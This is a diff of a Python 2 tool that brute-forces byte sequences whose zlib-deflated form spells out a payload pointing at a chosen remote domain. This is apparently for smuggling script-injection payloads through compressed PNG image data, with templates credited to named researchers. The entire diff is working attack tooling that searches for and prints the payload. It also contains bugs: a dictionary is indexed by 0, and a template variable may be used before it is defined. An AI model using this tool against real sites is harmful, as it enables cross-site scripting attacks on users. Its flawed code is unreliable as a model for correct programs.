@@ -1,12 +1,17 @@
 from math import floor
 from PIL import Image
 import zlib, binascii
+import re
 
-templateTable = {"BZ":["f399281922111510691928276e6e%s1e581b1f576e69b16375535b6f0e7f",0x111111,0xffffff], #Credit to Adam Logue
+domainAttackTemplateTable = {"BZ":["f399281922111510691928276e6e%s1e581b1f576e69b16375535b6f0e7f",0x111111,0xffffff], #Credit to Adam Logue
 	"PE":["7ff399281922111510691928276e6e%s1e51241f576e69b16375535b6f",0x111111,0xffffff], #Credit to fin1te
 	"CZ":["f399281922111510691928276e6e%s1e681b1f576e69b16375535b6f",0x111111,0xffffff], #Credit to Vavkamil
-	"threeXthree":["f399281922111510691928276e6e%s1e%s576e69b16375535b6f",0x111111,0xffffff],
-	"fourXtwo":["f399281922111510691928276e6e%s1e%s576e69b16375535b6f",0x11111111,0xffffffff]
+	"threeXthree":["f399281922111510691928276e6e%s1e51241f576e69b16375535b6f",0x111111,0xffffff], #PE tld crutch
+	"fourXtwo":["f399281922111510691928276e6e%s1e51231f576e69b16375535b6f",0x11111111,0xffffffff] #PE tld crutch
+	}
+
+tldAttackTemplateTable = {"threeXthree":["7ff399281922111510691928276e6e5111111e%s576e69b16375535b6f",0x111111,0xffffff], #PPP domain crutch
+	"fourXtwo":["7ff399281922111510691928276e6e511111111e%s576e69b16375535b6f", 0x1111, 0xffff] #PPPP domain crutch
 	}
 
 def gzdeflateBrute(remoteDomain, prefix, tld):
@@ -16,22 +21,52 @@ def gzdeflateBrute(remoteDomain, prefix, tld):
 	print "[-]Target Payload:", targetPayload
 
 	#Determine attack template
+	complex = 0
 	if len(prefix) > 3:
-		print "Domain > 3 -- Not implemented yet!"
+		print "[+]Domains > 3 -- Not implemented yet!"
 		return
-	if tld.upper() in templateTable.keys():
+	if tld.upper() in domainAttackTemplateTable.keys():
 		print "[+] Known tld found, using fast attack!"
-		template = templateTable[tld.upper()][0]
-		start = templateTable[tld.upper()][1]
-		end = templateTable[tld.upper()][2]
-	else:
-		if (len(tld) is 3) and (len(prefix) is 3):
-			template = templateTable["threeXthree"][0]
-			start = templateTable["threeXthree"][1]
-			end = templateTable["threeXthree"][2]
-		print "attack not implemented"
-		return
-	
+		template = domainAttackTemplateTable[tld.upper()][0]
+		start = domainAttackTemplateTable[tld.upper()][1]
+		end = domainAttackTemplateTable[tld.upper()][2]
+		payload = attackTemplate(template, start, end, targetPayload)
+		return payload
+
+	elif (len(tld) is 3) and (len(prefix) is 3):
+		print "[+] Using threeXthree attack..."
+		print "[+] Attempting to bruteforce tld first"
+		#attack tld first using PPP domain as a crutch
+		tldTemplate = tldAttackTemplateTable["threeXthree"][0]
+		start = tldAttackTemplateTable["threeXthree"][1]
+		end = tldAttackTemplateTable["threeXthree"][2]
+		tldCracked = attackTemplate(tldTemplate, start, end, targetPayload)
+
+		#if succesfful, build domain template using discovered tld as crutch
+		if tldCracked:
+			print "[!]COMPLETE: tld found -- attacking domain next"
+			regex = '6e6e511111111e(.*)576e69b163'
+			m = re.search(regex,tldCracked)
+			if m:
+				construct = tldAttackTemplateTable[0] % m.group(1)
+				domainTemplate = construct.replace("511111","%s")
+				print "[-] Domain Attack Template: %s" % domainTemplate
+				
+
+		#attack domain using discovered tld as crutch
+		start = domainAttackTemplateTable["threeXthree"][1]
+		end = domainAttackTemplateTable["threeXthree"][2]
+		payload = attackTemplate(domainTemplate, start, end, targetPayload)
+		
+		if payload:
+			return payload
+		else:
+			return
+	else: 
+		print "Attack for this domain not implement yet"
+		return False
+
+def attackTemplate(template, start, end, targetPayload):
 	#Get keyspace
 	keyspace = end-start
 	print "[-]Calculated Keyspace: %s" % str(keyspace)
@@ -49,14 +84,13 @@ def gzdeflateBrute(remoteDomain, prefix, tld):
 		guess = template % brute
 		deflate = gzdeflate(hex2bin(guess))
 		if targetPayload.upper() in deflate.upper():
-			print "[!]GZDEFLATE PAYLOAD FOUND!"
-			print "Gzdeflate Payload String: %s" % repr(deflate)
-			print "Gzdeflate Payload: %s" % guess
+			print "[!]PAYLOAD FOUND!"
+			print "Payload String: %s" % repr(deflate)
+			print "Payload: %s" % guess
 			return guess
 		start += 1
 		i+=1
 	return False
-
 
 def gzdeflate(string):
         deflated = zlib.compress(string)[2:-4]
